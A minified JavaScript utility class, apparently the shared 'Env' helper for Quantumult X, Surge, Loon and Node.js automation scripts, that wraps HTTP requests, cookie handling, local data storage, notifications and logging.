function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}